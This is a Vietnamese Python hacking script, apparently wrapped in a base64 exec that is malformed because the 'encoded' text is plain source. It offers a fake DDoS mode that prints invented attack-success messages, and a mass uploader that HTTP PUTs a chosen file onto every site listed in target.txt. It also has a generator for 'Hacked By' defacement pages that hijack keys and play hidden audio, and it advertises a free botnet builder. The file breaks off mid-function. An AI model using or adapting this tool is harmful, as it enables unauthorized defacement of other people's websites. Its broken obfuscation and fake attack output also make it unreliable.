#coding :utf8
#enode :base64
# authur : Nguyễn Văn Đức
# Cảm ơn bạn đã sử dụng script của tôi <3

import base64
exec(base64.b64decode('import sys,os,time
from datetime import datetime
import socket
import os.path
from os import path

try :
  import pathlib
  import random
  from pystyle import Write, Colors,Colorate
except :
  os.system('pip install pystyle')
  os.system('pip install random')
  os.system('pip install pathlib')

file = pathlib.Path("lam_mau_ver3.py")
if file.exists ():
    print ("LÀM MÀU VER3 AHIHI ")
else:
    print ("Khum đổi được tên file đâu bạn iu:v")
    print("tính đổi để nhận mình làm hả khumcó chuyện đó đâu ahihi")
    sys.exit()


color1 = Colors.red_to_yellow
color2 = Colors.green_to_blue
color3 = Colors.blue_to_red
color4 = Colors.red_to_purple
color5 = Colors.purple_to_blue
color6 = Colors.blue_to_cyan
color7 = Colors.cyan_to_green
color8 = Colors.green_to_red
color9 = Colors.red_to_blue
color10 = Colors.blue_to_white
color11 = Colors.green_to_white
# lấy giờ phút giây
# Get Ip Adress
try:
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.connect(("8.8.8.8", 80))
  ip_address = s.getsockname()[0]
except :
  s = False
  print('bạn đang không kết nối với internet -> không lấy được địa chỉ IP')
  ip_address = 'Get IP Failed!!'  

#print("The current year is ", currentDateAndTime.year) # Output: The current year is  2022
#print("The current month is ", currentDateAndTime.month) # Output: The current month is  3 
#print("The current day is ", currentDateAndTime.day) # Output: The current day is  19
#print("The current hour is ", currentDateAndTime.hour) # Output: The current hour is  10 
#print("The current minute is ", currentDateAndTime.minute) # Output: The current minute is  49
#print("The current second is ", currentDateAndTime.second) # Output: The current second is  18
list_color = [color1,color2,color3,color4,color5,color6,color7,color8,color9,color10,color11]

random_color = random.choice(list_color)  
n = 0
n2 = 0
Write.Print("Hãy Nhọn Mode Chạy [1:Vô Tận] [2:Giới Hạn] [3: Fake Attack] [4: Up Shell]\n",random_color, interval=0.0025)
Write.Print("Donate me: 0373871213 Mb bank kèm theo sdt bạn khi chuyển khoản, tôi sẽ tặng bạn 1 trình tạo botnet miễn phí ^_^\n",random_color, interval=0.0025)

mode = Write.Input("Chọn 1/2/3/4 : ",random_color, interval=0.0025)
if mode == '1' or mode == 'vo tan':
  lap_chu1 = Write.Input("Bạn MuốN Viết Gì? :",random_color, interval=0.0025)
  while True:
    currentDateAndTime = datetime.now()
    gio = currentDateAndTime.hour
    phut = currentDateAndTime.minute
    giay = currentDateAndTime.second
    random_color = random.choice(list_color)  
    n = n + 1
    Write.Print(f'[{gio}:{phut}:{giay}] | [{n}] | {lap_chu1} \n',random_color,interval=0.00000000000015)

if mode == '2' or mode == 'gioi han':
    lap_chu2 = Write.Input("Bạn MuốN Viết Gì? :",random_color, interval=0.0025)
    so_lan_lap = Write.Input('Nhập Số Lần Lặp : ',random_color, interval=0.0025)
    so_lan_lap = int(so_lan_lap)  
    for loop in range(so_lan_lap):
      currentDateAndTime = datetime.now()
      gio = currentDateAndTime.hour
      phut = currentDateAndTime.minute
      giay = currentDateAndTime.second
      random_color = random.choice(list_color)  
      n2 = n2 + 1
      Write.Print(f'[{gio}:{phut}:{giay}] | [{n2}] | {lap_chu2} \n',random_color,interval=0.00000000000015)
    print('Hết rùi !!')  
if mode == '3' :

 
  url = Write.Input('Nhâp Địa Chỉ Website : ',random_color, interval=0.0025)  
  time = Write.Input("Bạn Muốn Tấn Công Trong Bao Lâu :",random_color, interval=0.0025)
  status_web = ['405','502','503','404','408','302']
  
  time = int(time)
  Write.Print(f'Bắt Đầu Tấn Công {url} Trong {time} \n',random_color,interval=0.00000000000015)
  Write.Print(f'Địa Chỉ IP Của Bạn : {ip_address} \n',random_color,interval=0.00000000000015)
  while True:

      if time <= 0 :
        Write.Print(f'WEB BAY CHẮC LUÔN RÙI =)) \n',random_color,interval=0.00000000000015)
        sys.exit()
      radom_thread = random.choice(status_web)  
      time = time - 1
      r1 = random.randint(600, 9000)
      currentDateAndTime = datetime.now()
      gio = currentDateAndTime.hour
      phut = currentDateAndTime.minute
      giay = currentDateAndTime.second
      random_color = random.choice(list_color) 
      Write.Print(f'From {ip_address} | ATTACK SUCCESS {url} | Time: {time} | ({radom_thread}) Thread {r1} \n',color11,interval=0.00000000000015)
if mode == '4':
  try:
   import requests
   import os.path
   import sys
   import random
  except ImportError:
    exit("install requests and try again ...")

banner = """
/***
 *    .__....__...................______...__..................__..__........________...................__.
 *    /..|../..|................./......\./..|................/..|/..|....../........|................./..|
 *    $$.|..$$.|..______......../$$$$$$..|$$.|____....______..$$.|$$.|......$$$$$$$$/______....______..$$.|
 *    $$.|..$$.|./......\.......$$.\__$$/.$$......\../......\.$$.|$$.|.........$$.|./......\../......\.$$.|
 *    $$.|..$$.|/$$$$$$..|......$$......\.$$$$$$$..|/$$$$$$..|$$.|$$.|.........$$.|/$$$$$$..|/$$$$$$..|$$.|
 *    $$.|..$$.|$$.|..$$.|.......$$$$$$..|$$.|..$$.|$$....$$.|$$.|$$.|.........$$.|$$.|..$$.|$$.|..$$.|$$.|
 *    $$.\__$$.|$$.|__$$.|....../..\__$$.|$$.|..$$.|$$$$$$$$/.$$.|$$.|.........$$.|$$.\__$$.|$$.\__$$.|$$.|
 *    $$....$$/.$$....$$/.......$$....$$/.$$.|..$$.|$$.......|$$.|$$.|.........$$.|$$....$$/.$$....$$/.$$.|
 *    .$$$$$$/..$$$$$$$/.........$$$$$$/..$$/...$$/..$$$$$$$/.$$/.$$/..........$$/..$$$$$$/...$$$$$$/..$$/.
 *    ..........$$.|.......................................................................................
 *    ..........$$.|.......................................................................................
 *    ..........$$/........................................................................................
 */
 Tool làm bởi Vduc006
 Source gốc Github | Đã được mod lại:3
 Nếu bạn không biết cách chạy hãy nhập :hdsd ở phần nhập tên file nhé!!
 Donate me: 0373871213 Mb bank kèm theo sdt bạn khi chuyển khoản, tôi sẽ tặng bạn 1 trình tạo botnet miễn phí ^_^

"""

b = '\033[31m'
h = '\033[32m'
m = '\033[00m'

def x(tetew):
   ipt = ''
   if sys.version_info.major > 2:
      ipt = input(tetew)
   else:
      ipt = raw_input(tetew)
   
   return str(ipt)

def aox(script,target_file="target.txt"):
   op = open(script,"r").read()
   with open(target_file, "r") as target:
      target = target.readlines()
      s = requests.Session()
      print("uploading file to %d website"%(len(target)))
      for web in target:
         thanh_cong = ['Thành Công!!','Đã Xong!!','Hú ÝE!!','Ngon Lành!!']
         that_bai = ['Ui Hỏng!!','Thôi Xong!!','Lỗi Rồi!!','Thất Bại']
         random1 = random.choice(thanh_cong)
         random2 = random.choice(that_bai)
         try:
            site = web.strip()
            if site.startswith("http://") is False:
               site = "http://" + site
            req = s.put(site+"/"+script,data=op)
            if req.status_code < 200 or req.status_code >= 250:
               print(m+"["+b+" FAILED!"+m+" ] %s/%s"%(site,script))
            else:
               print(m+"["+h+" SUCCESS"+m+" ] %s/%s"%(site,script))
         except requests.exceptions.RequestException:
            continue
         except KeyboardInterrupt:
            print; exit()

def main(__bn__):
   print(__bn__)
   
   while True:
      try:
         a = x("Nhập Tên File (có đuôi là .html): ")
         if a == 'taomau':
          
          print("Chào Mừng Đến Với Trình Tạo Mẫu :3")
          print("[Bản Quyền Nguyễn Văn Đức] [Liên Hệ: 0373871213] ")
          print('''

          Trước khi vào tool bạn cần lưu ý
          1) Làm theo ảnh tôi đã gửi
          2) Vui lòng không hỏi tôi gì thêm về tool
          3) Tool đã có phần hsd chi tiết
              -chúc bạn vui vẻ-''')
          input('nhập bất kì để vào tool > ')
          try :
              os.system('cls')  
          except :    
              os.system('clear')
          print('''Vui lòng chọn 1 trong các mẫu sau:
                  1] Mẫu 1 , nhập mau1
                  2] Mẫu 2 , nhập mau2
                  3] Mẫu 3 , nhập mau3
                  4] Mẫu 4 , nhập mau4''')
          ten_mau = input("NHẬP > ")
          if ten_mau == 'mau1':
                  
              print('bạn đang tạo code với mẫu 1 <3')
              tao_moi = input('nhập tên file(phải có .html ở cuối) :')
              vi_tri1 = input('Nhập chữ vị trí 1 :')
              vi_tri2 = input('Nhập chữ vị trí 2 :')
              vi_tri3 = input('Nhập chữ vị trí 3 :')
              mau1 = '''
          <!doctype html>
          <html lang="en">
            <head>
            <center> <p><font face="Jolly Lodger" color="red" size="30">-1-</p>
              <meta charset="utf-8">
              <meta name="viewport" content="width=device-width, initial-scale=0.75, shrink-to-fit=no">
              <meta name="theme-color" content="#000">
              <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
              <link href="https://fonts.googleapis.com/css?family=Almendra+Display|Almendra+SC|Piedra&display=swap" rel="stylesheet">
              <link href='http://fonts.googleapis.com/css?family=Jolly+Lodger' rel='stylesheet' type='text/css'>
                <script type="text/javascript" src="js/bootstrap.min.js"></script>
                <script type="text/javascript" src="js/jquery.js"></script>
                <script type="text/javascript" src="js/jquery-1.10.2.min.js.download"></script>
                <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
                <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
              <title>|hv Vduc006|</title>
              <iframe frameborder="0" height="1" width="1" loop="true" allow="autoplay" src="http://upir.ir/images/twzc4383c491h9jq25l.mp3"></iframe> 
              <style>
                body {
                  background-color: black;
                  padding:0;
                  margin:0;
                }
                .tmp {
                  padding-top: 25%;
                }
                .satu {
                  font-family: "Almendra SC";
                  color:white;
              text-shadow: 0 0 4px green, 0px 0px 20px red;
                  animation: blikk 6s linear infinite;
                }
                small {
                  font-family: "Almendra SC";
                  color:white;
              text-shadow: 0 0 4px green, 0px 0px 20px red;
                }
                h1 {
                  font-family: "Almendra Display";
                  color:white;
            text-shadow: 0 0 20px green, 0px 0px 20px red;
                }
                .ico {
                  width:250px;
                  height:250px;
                  margin:0;
                  padding:0;
                }
                #particles-js {
                  width: 100%;
                  height: 100%; 
                  background-size: cover; 
                  background-position: 50% 50%; 
                  position: fixed; 
                  top: 0px; 
                  z-index:1;
                } 
                @keyframes blikk{
                  0% {
                    color: darkred;
                    text-shadow: 0 0 20px red, 0px 0px 20px green;
                  }
                  50% {
                    color: white;
                    text-shadow: 0 0 20px red, 0px 0px 20px green;
                  }
                  100% {
                    color: darkred;
                    text-shadow: 0 0 20px red, 0px 0px 20px green;
                  }
                }
              </style>
            </head>
            <body id="">
              <div class="tmp" id="">
                <div class="container">
          <center><h1><font face="Jolly Lodger" color="red" size="35">Hacked By <font color="red">-2-<br></font></center>
                <center><center><img src="https://benhviencongnghe.vn/wp-content/uploads/2022/08/1660169513_931_Tong-hop-100-meme-cheems-thu-vi-sieu-hai-huoc.jpg" height='275px' width='275px'></font></center><center></font></font>
          <br>
          <center><font size="5" color="red">{DEAR ADMIN}<font size="5" color="white"></font></font>
          <br>
          <font size="4" color="red">We Found Vulnerability In Your <font></font><font color="silver" size="4">Website...!</font></font>
          <br>
          <font size="3" color="red">This Is Your Last Warning!!!<font size="5" color="white"></font></font>
          <br>
          <font size="3" color="silver">So Fix Your Website Vulnerability<font size="5" color="white"></font></font>
          <br>
          <center><font color="red" size="4">And Next Time Be Careful </font></font>
          <br>
          <br>
          <br>
          <font face="Jolly Lodger" color="red" size="25">&#10026 TEAM &#10026;  <br><font face="Jolly Lodger" color="white" size="20"> &#9760 -3- &#9760; </font></font>
          <div id="particles-js">
            <canvas class="particles-js-canvas-el" style="width: 100%; height: 100%;" width="1365" height="949"></canvas>
          </div>
            </div>
            <script src="https://cdn.rawgit.com/FicriPebriyana/efek/0a935a6c/efek%20salju.js" type="text/javascript"></script>
            <script type="text/javascript">
                $.getScript("https://cdnjs.cloudflare.com/ajax/libs/particles.js/2.0.0/particles.min.js", function(){ 
                particlesJS('particles-js', {
                  "particles": {
                      "number": {
                          "value": 80, 
                          "density": {
                          "enable": true, 
                          "value_area": 800 
                        } }, "color": {
                          "value": "#FFFFFF"}, 
                          "shape": { "type": "circle", 
                          "stroke": { "width": 0, "color": "#000000" }, 
                          "polygon": { "nb_sides": 5 }, 
                          "image": { "width": 100, "height": 100 } }, 
                          "opacity": { "value": 0.5, "random": false, 
                          "anim": { 
                              "enable": false, 
                              "speed": 1, 
                              "opacity_min": 0.1, 
                              "sync": false } }, 
                          "size": { 
                              "value": 5, 
                              "random": true, 
                          "anim": { 
                              "enable": false, 
                              "speed": 40, 
                              "size_min": 0.1, 
                              "sync": false } }, 
                          "line_linked": { 
                              "enable": true, 
                              "distance": 150, 
                              "color": "#ff0a0a", 
                              "opacity": 0.4, 
                              "width": 1 }, 
                          "move": { 
                              "enable": true, 
                              "speed": 2, 
                              "direction": "none", 
                              "random": false, 
                              "straight": false, 
                              "out_mode": "out", 
                          "attract": { "enable": false, "rotateX": 600, "rotateY": 1200 } } }, 
                          "interactivity": { 
                          "detect_on": "canvas", 
                          "events": { 
                          "onhover": { 
                          "enable": true, "mode": "repulse" }, 
                          "onclick": { 
                              "enable": true, 
                              "mode": "push" }, 
                          "resize": true }, 
                          "modes": { 
                          "grab": { "distance": 400, "line_linked": { 
                          "opacity": 1 } }, 
                          "bubble": { "distance": 400, "size": 50, "duration": 2, "opacity": 8, "speed": 1 }, 
                          "repulse": { "distance": 200 }, 
                          "push": { "particles_nb": 4 }, "remove": { 
                          "particles_nb": 2 } } }, 
                          "retina_detect": true, "config_demo": { 
                          "hide_card": false, 
                          "background_color": "#ff0a0a", 
                          "background_image": "", 
                          "background_position": "50% 50%", 
                          "background_repeat": 
                          "no-repeat", 
                          "background_size": "cover" 
                          } 
                        });
                      }); 
                  </script>
            </body>
          </html>
          '''
              file_moi = open(tao_moi,'x')
              file_moi.write(mau1)
              file_moi.close()
              with open(tao_moi, 'r') as file :
                  filedata = file.read()
                  filedata = filedata.replace('-1-',vi_tri1)
                  filedata = filedata.replace('-2-',vi_tri2)
                  filedata = filedata.replace('-3-',vi_tri3)
              with open(tao_moi, 'w') as file:
                  file.write(filedata)
          if ten_mau == 'mau2':
              print('Bạn đang tạo code với mẫu 2 <3')
              mau2_tao_moi = input('nhập tên file(phải có .html ở cuối) :')
              mau2_vi_tri1 = input("Nhập chữ vị trí 1 :")
              mau2_vi_tri2 = input("Nhập chữ vị trí 2 :")
              mau2_vi_tri3 = input("Nhập chữ vị trí 3 :")
              mau2_vi_tri4 = input("Nhập chữ vị trí 4 :")
              mau2_vi_tri5 = input("Nhập chữ vị trí 5 :")
              mau2_vi_tri6 = input("Nhập chữ vị trí 6 :")
              mau2_vi_tri7 = input("Nhập chữ vị trí 7 :")
              mau2_vi_tri8 = input("Nhập chữ vị trí 8 :")
              mau2_vi_tri9 = input("Nhập chữ vị trí 9 :")
              mau2_vi_tri10 = input("Nhập chữ vị trí 10 :")
              mau2_vi_tri11 = input("Nhập chữ vị trí 11 :")
              mau2_vi_tri12 = input("Nhập chữ vị trí 1 2:")
              mau2 = '''
              <!DOCTYPE html>
          <html>

          <head>
            <title>Hacked By RenoXfares</title>
            <meta charset="UTF-8">
            <meta name="Author" content="red hat hacker"/>
            <meta name="copyright" content="kebebasan bukanlah kejahatan"/>
            <meta name="description" content="Hacking website "/>
            <link href="https://fonts.googleapis.com/css?family=Iceland:400,700" rel='stylesheet' type='text/css'>
            <link href="https://fonts.googleapis.com/css?family=Iceland:400,700" rel='stylesheet' type='text/css'>
            <meta property="og:image" content="">
              <style type="text/css">
                body {
                  overflow:hidden;
                  background-image:url('http://www.drodd.com/images16/black-picture8.jpg');
                  background-color: #000000;
                  background-repeat:no-repeat;
                  background-size: 100% ;
                  background-position:top center;
                  margin: 0px;
                  cursor:none;
                  font-family: Iceland, sans-serif;
                }
                a{
                  text-decoration: none;
                }
                h1{
                font-family: Iceland, sans-serif;
                font-size:90px;
                color:#fff;
                margin:0px 0px 0px;
                
                }
                h2{
                font-family: Iceland, sans-serif;
                font-size:40px;
                color:#000;
                margin: 0px;
                text-shadow: 0 0 3px #fff;
                
                }
                p{
                color:#fff;
                font-size:25px;
                margin: 0px;
                text-shadow: 0 0 3px #ff0099;

                }
                .fot{
                font-family: Iceland, sans-serif;
                font-size:14px;
                color:#fff;
                margin: 0px;
                text-shadow: 0 0 3px #000, 0px 0px 5px #000;
                }
                h1{
                color:#000;
                text-shadow: 0 0 5px #fff;
              }
              .greets{
            font-family: Arial, sans-serif;
            line-height: 24px;
            font-size: 11px;
            width: 50%;
            background: #000;
            opacity: 0.9;
            text-transform: uppercase;
            z-index: 9999;
            border-radius:10px;
            -moz-box-shadow: 1px 0px 2px #000;
            -webkit-box-shadow: 1px 0px 2px #000;
            box-shadow: 1px 0px 2px #000;
          }
              </style>
                  <script type='text/javascript'>
                    //<![CDATA[
                    // JavaScript Document
                    var message="NoRightClicking"; function defeatIE() {if (document.all) {(message);return false;}} function defeatNS(e) {if (document.layers||(document.getElementById&&!document.all)) { if (e.which==2||e.which==3) {(message);return false;}}} if (document.layers) {document.captureEvents(Event.MOUSEDOWN);document.onmousedown=defeatNS;} else{document.onmouseup=defeatNS;document.oncontextmenu=defeatIE;} document.oncontextmenu=new Function("return false")
                    //]]>
                    </script>
            </head> 
            <div id="I301_html">

          <script type="text/javascript" src="https://code.jquery.com/jquery.min.js"></script>

          <script type="text/javascript">setTimeout("$('#loading').fadeOut(5000);", 10000);  </script>

          <style type="text/css">#loading{position:fixed;top:0;left:0;padding-top:0px;background-color:#000;width:100%;height:100%;color:black;z-index:9000;overflow:hidden;}</style>
          
          <div id="loading">
          <body onload="document.f.p.focus()" topmargin="0" leftmargin="0" bgcolor="#000000" marginheight="0" marginwidth="0">
          <table border="0" cellpadding="2" cellspacing="0" width="100%">
          <tbody><tr> 


          </tr>
            
          <tr>



          </tr>
          </tbody></table> 
          <font id="ResponseData" color="#ff99cc">
          <pre><script type="text/javascript">
          TypingText = function(element, interval, cursor, finishedCallback) {
            if((typeof document.getElementById == "undefined") || (typeof element.innerHTML == "undefined")) {
              this.running = true;	// Never run.
              return;
            }
            this.element = element;
            this.finishedCallback = (finishedCallback ? finishedCallback : function() { return; });
            this.interval = (typeof interval == "undefined" ? 100 : interval);
            this.origText = this.element.innerHTML;
            this.unparsedOrigText = this.origText;
            this.cursor = (cursor ? cursor : "");
            this.currentText = "";
            this.currentChar =0;
            this.element.typingText = this;
            if(this.element.id == "") this.element.id = "typingtext" + TypingText.currentIndex++;
            TypingText.all.push(this);
            this.running = false;
            this.inTag = false;
            this.tagBuffer = "";
            this.inHTMLEntity = false;
            this.HTMLEntityBuffer = "";
          }
          TypingText.all = new Array();
          TypingText.currentIndex = 0;
          TypingText.runAll = function() {
            for(var i = 0; i < TypingText.all.length; i++) TypingText.all[i].run();
          }
          TypingText.prototype.run = function() {
            if(this.running) return;
            if(typeof this.origText == "undefined") {
              setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);	// We haven't finished loading yet.  Have patience.
              return;
            }
            if(this.currentText == "") this.element.innerHTML = "";
          //  this.origText = this.origText.replace(/<([^<])*>/, "");     // Strip HTML from text.
            if(this.currentChar < this.origText.length) {
              if(this.origText.charAt(this.currentChar) == "<" && !this.inTag) {
                this.tagBuffer = "<";
                this.inTag = true;
                this.currentChar++;
                this.run();
                return;
              } else if(this.origText.charAt(this.currentChar) == ">" && this.inTag) {
                this.tagBuffer += ">";
                this.inTag = false;
                this.currentText += this.tagBuffer;
                this.currentChar++;
                this.run();
                return;
              } else if(this.inTag) {
                this.tagBuffer += this.origText.charAt(this.currentChar);
                this.currentChar++;
                this.run();
                return;
              } else if(this.origText.charAt(this.currentChar) == "&" && !this.inHTMLEntity) {
                this.HTMLEntityBuffer = "&";
                this.inHTMLEntity = true;
                this.currentChar++;
                this.run();
                return;
              } else if(this.origText.charAt(this.currentChar) == ";" && this.inHTMLEntity) {
                this.HTMLEntityBuffer += ";";
                this.inHTMLEntity = false;
                this.currentText += this.HTMLEntityBuffer;
                this.currentChar++;
                this.run();
                return;
              } else if(this.inHTMLEntity) {
                this.HTMLEntityBuffer += this.origText.charAt(this.currentChar);
                this.currentChar++;
                this.run();
                return;
              } else {
                this.currentText += this.origText.charAt(this.currentChar);
              }
              this.element.innerHTML = this.currentText;
              this.element.innerHTML += (this.currentChar < this.origText.length - 1 ? (typeof this.cursor == "function" ? this.cursor(this.currentText) : this.cursor) : "");
              this.currentChar++;
              setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);
            } else {
            this.currentText = "";
            this.currentChar = 0;
                  this.running = false;
                  this.finishedCallback();
            }
          }
          </script>
          <script>
          function disableselect(e){return false}

          function reEnable(){return true}

          //if IE4+
          document.onselectstart=new Function ("return false")

          //if NS6
          if (window.sidebar){
          document.onmousedown=disableselect
          document.onclick=reEnable
          }
          </script>
          <script>
          var message="";
          function clickIE()

          {if (document.all)
          {(message);return false;}}

          function clickNS(e) {
          if
          (document.layers||(document.getElementById&&!document.all))
          {
          if (e.which==2||e.which==3) {(message);return false;}}}
          if (document.layers)
          {document.captureEvents(Event.MOUSEDOWN);document.  onmousedown=clickNS;}
          else
          {document.onmouseup=clickNS;document.oncontextmenu  =clickIE;}

          document.oncontextmenu=new Function("return false")
          </script>

          <table style=" background-repeat: no-repeat;"  align="right" border="0" width="100%" >

          <br>

          <tbody><tr>
          <td  valign="top"><p id="hack" >

          <br>
          <br>
          <font style="color:#ffffff;text-shadow:#FF0099 0px 0px 10px"> &nbsp;&nbsp;&nbsp;&nbsp;<b>[+] -1-</font> <br>
          <font style="color:#ffffff;text-shadow:#FF0099 0px 0px 10px"> &nbsp;&nbsp;&nbsp;&nbsp;<b>[+] -2- </font><br>
          <font style="color:#ffffff;text-shadow:#FF0099 0px 0px 10px"> &nbsp;&nbsp;&nbsp;&nbsp;<b>[+] -3-</font><br>
          <font style="color:#ffffff;text-shadow:#FF0099 0px 0px 10px"> &nbsp;&nbsp;&nbsp;&nbsp;<b>[+] <font style="color:red;text-shadow:#000 0px 0px 3px">-4-</font><font style="color:white;text-shadow:#000 0px 0px 3px">-5-</font>  [+]         </font> <br>
                    <font color="White"> 
            
                    
          </p></tr>
          </tbody></table>                 </div> 
          <br>

          <script type="text/javascript">
          new TypingText(document.getElementById("hack"), 50, function(i) { var ar = new Array("_",""); return " " + ar[i.length % ar.length]; });
          TypingText.runAll();

          </script>

              <style> 
          
                td
          
                {
          
                  background-color: #000000;
          
                  font-family: Courier New;
          
                  font-size:20px;
          
                  color:#000000;
          
                  border-color: #000000;
          
                  border-width:1pt;
          
                  border-style:solid;
          
                  border-collapse:collapse;
          
                  padding:0pt 3pt;
          
                  vertical-align:top;
          
                }
          
                table
          
                {
          
                  border-color: #88aace;
          
                  border-width:0pt 1pt;
          
                  border-style:dash;
          
                }
          
                A:Link, A:Visited
          
                {
          
                  color: #88aace;
          
                }
          
                A.no:Link, A.no:Visited
          
                {
          
                  color: #88aace;
          
                  text-decoration: none;
          
                }
          
                A:Hover, A:Visited:Hover , A.no:Hover, A.no:Visited:Hover
          
                {
          
                  color: #88aace;
          
                  background-color:#2e2e2e;
          
                  text-decoration:
          
                  overline underline;
          
                }
          
                .style1
          
                {
          
                  color: #88aace
          
                }
          
                .style2
          
                {
          
                  color: 1f1f1f
          
                }
          
                body
          
                {
          
                  color:white;
                  
                  background-position:right;
          
                  background-attachment:fixed;
          
                  </div>
          
                }
          
              </style>
                  
          
          </div>

          </div>
          <body oncontextmenu="return false" onkeydown="return false">
          <center>
          <h2 class="glow"><font style="color:green;text-shadow:#000 0px 0px 3px"></font><font style="color:red;text-shadow:#000 0px 0px 3px">-6-</font><font style="color:white;text-shadow:#000 0px 0px 3px"> -7-</font>
          <font style="color:green;text-shadow:#000 0px 0px 3px"></font></h2>
          <img src="https://1.bp.blogspot.com/-r9z7gno_Kmc/WKzuDapzzkI/AAAAAAAAAfs/iEco8UwEuiMxvovwEGuLcZkO0AN8mfxBQCLcB/s1600/logo%2B5.jpg"width="350"height="350">
          <h2 class="glow2" ><font style="color:yellow;text-shadow:#000 0px 0px 3px">.::-8-::.</font><br> <span style="color:orange;font-family:Iceland;text-shadow:white 0px 0px 10px">./</span><span style="color:#ffffff;font-family:Iceland;text-shadow:#FF0099 0px 0px 10px">-9-</span></b></h2>
          <p><b><font style="color:green;text-shadow:#000 0px 0px 3px">Sorry Admin, I Was On Your System. By </font><span style="font-family:Iceland;color:red;text-shadow:#000 0px 0px 3px">-10- ,</span>
                <font style="color:green;text-shadow:#000 0px 0px 3px">PLEASE </font><font style="color:blue;text-shadow:#000 0px 0px 3px">CHECK AND PATCH</font>
                <font style="color:green;text-shadow:#000 0px 0px 3px"> YOUR SECURITY !</font><br><font style="color:yellow;text-shadow:#000 0px 0px 3px">#*#*#*#</font>
                  </p>
              </span>
                <div style="font-size:10px;color:gold;text-shadow:grey 0px 0px 3px">
              <span style="font-family:Iceland;font-weight:bold;color:#ffffff"><p><font style="color:green;text-shadow:#000 0px 0px 3px">~-11-~</font></p></span>
            </div>
          
          <div class="greets">
          <table align=center border="0">
          <tr>
          <td width=100% id=greetz>
          <marquee behavior="scroll" direction="left" scrollamount="4" scrolldelay="55" width="100%">
          <font size="5px" style="font-family: Iceland, sans-serif;color:white;text-shadow: 0 0 3px red, 0px 0px 5px red" >
          <b>-=|-12-|=-</font>
          </marquee>
          </td>
          </table></div> 
          <div class="fot">
          Copyrights &copy; Vduc006
          </div>
          </center>
          <script type="text/javascript" src="https://sites.google.com/site/bituotblog/disable-copy.js"></script>
          <style>
          body{
          -moz-user-select: none !important;
          -webkit-touch-callout: none!important;
          -webkit-user-select: none!important;
          -khtml-user-select: none!important;
          -moz-user-select: none!important;
          -ms-user-select: none!important;
          user-select: none!important;
          }
          </style>
          <script type='text/javascript'>
              //<![CDATA[
              shortcut={all_shortcuts:{},add:function(a,b,c){var d={type:"keydown",propagate:!1,disable_in_input:!1,target:document,keycode:!1};if(c)for(var e in d)"undefined"==typeof c[e]&&(c[e]=d[e]);else c=d;d=c.target,"string"==typeof c.target&&(d=document.getElementById(c.target)),a=a.toLowerCase(),e=function(d){d=d||window.event;if(c.disable_in_input){var e;d.target?e=d.target:d.srcElement&&(e=d.srcElement),3==e.nodeType&&(e=e.parentNode);if("INPUT"==e.tagName||"TEXTAREA"==e.tagName)return}d.keyCode?code=d.keyCode:d.which&&(code=d.which),e=String.fromCharCode(code).toLowerCase(),188==code&&(e=","),190==code&&(e=".");var f=a.split("+"),g=0,h={"`":"~",1:"!",2:"@",3:"#",4:"$",5:"%",6:"^",7:"&",8:"*",9:"(",0:")","-":"_","=":"+",";":":","'":'"',",":"<",".":">","/":"?","\\":"|"},i={esc:27,escape:27,tab:9,space:32,"return":13,enter:13,backspace:8,scrolllock:145,scroll_lock:145,scroll:145,capslock:20,caps_lock:20,caps:20,numlock:144,num_lock:144,num:144,pause:19,"break":19,insert:45,home:36,"delete":46,end:35,pageup:33,page_up:33,pu:33,pagedown:34,page_down:34,pd:34,left:37,up:38,right:39,down:40,f1:112,f2:113,f3:114,f4:115,f5:116,f6:117,f7:118,f8:119,f9:120,f10:121,f11:122,f12:123},j=!1,l=!1,m=!1,n=!1,o=!1,p=!1,q=!1,r=!1;d.ctrlKey&&(n=!0),d.shiftKey&&(l=!0),d.altKey&&(p=!0),d.metaKey&&(r=!0);for(var s=0;k=f[s],s<f.length;s++)"ctrl"==k||"control"==k?(g++,m=!0):"shift"==k?(g++,j=!0):"alt"==k?(g++,o=!0):"meta"==k?(g++,q=!0):1<k.length?i[k]==code&&g++:c.keycode?c.keycode==code&&g++:e==k?g++:h[e]&&d.shiftKey&&(e=h[e],e==k&&g++);if(g==f.length&&n==m&&l==j&&p==o&&r==q&&(b(d),!c.propagate))return d.cancelBubble=!0,d.returnValue=!1,d.stopPropagation&&(d.stopPropagation(),d.preventDefault()),!1},this.all_shortcuts[a]={callback:e,target:d,event:c.type},d.addEventListener?d.addEventListener(c.type,e,!1):d.attachEvent?d.attachEvent("on"+c.type,e):d["on"+c.type]=e},remove:function(a){var a=a.toLowerCase(),b=this.all_shortcuts[a];delete this.all_shortcuts[a];if(b){var a=b.event,c=b.target,b=b.callback;c.detachEvent?c.detachEvent("on"+a,b):c.removeEventListener?c.removeEventListener(a,b,!1):c["on"+a]=!1}}},shortcut.add("Ctrl+U",function(){top.location.href="https://www.facebook.com/profile.php?id=100065525475828/"}),shortcut.add("F12",function(){top.location.href="https://www.facebook.com/profile.php?id=100065525475828/"}),shortcut.add("Ctrl+Shift+I",function(){top.location.href="https://www.facebook.com/profile.php?id=100065525475828/"}),shortcut.add("Ctrl+S",function(){top.location.href="https://www.facebook.com/profile.php?id=100065525475828/"}),shortcut.add("Ctrl+Shift+C",function(){top.location.href="https://www.facebook.com/profile.php?id=100065525475828/"});
              //]]>
              </script>
          </body>
          <object data="https://flash-mp3-player.net/medias/player_mp3.swf" width="0" height="0" type="application/x-shockwave-flash"><param value="#ffffff" name="bgcolor"><param value="mp3=http://zizka.free.fr/_muisc/04-kanye_west-amazing_ft._young_jeezy-(HHKingz.net).mp3&amp;loop=1&amp;autoplay=1&amp;volume=125" name="FlashVars"></object>  '''
              mau2_file_moi = open(mau2_tao_moi,'x')
              mau2_file_moi.write(mau2)
              mau2_file_moi.close()
              with open(mau2_tao_moi, 'r') as file :
                  filedata = file.read()
                  filedata = filedata.replace('-1-',mau2_vi_tri1)
                  filedata = filedata.replace('-2-',mau2_vi_tri2)
                  filedata = filedata.replace('-3-',mau2_vi_tri3)
                  filedata = filedata.replace('-4-',mau2_vi_tri4)
                  filedata = filedata.replace('-5-',mau2_vi_tri5)
                  filedata = filedata.replace('-6-',mau2_vi_tri6)
                  filedata = filedata.replace('-7-',mau2_vi_tri7)
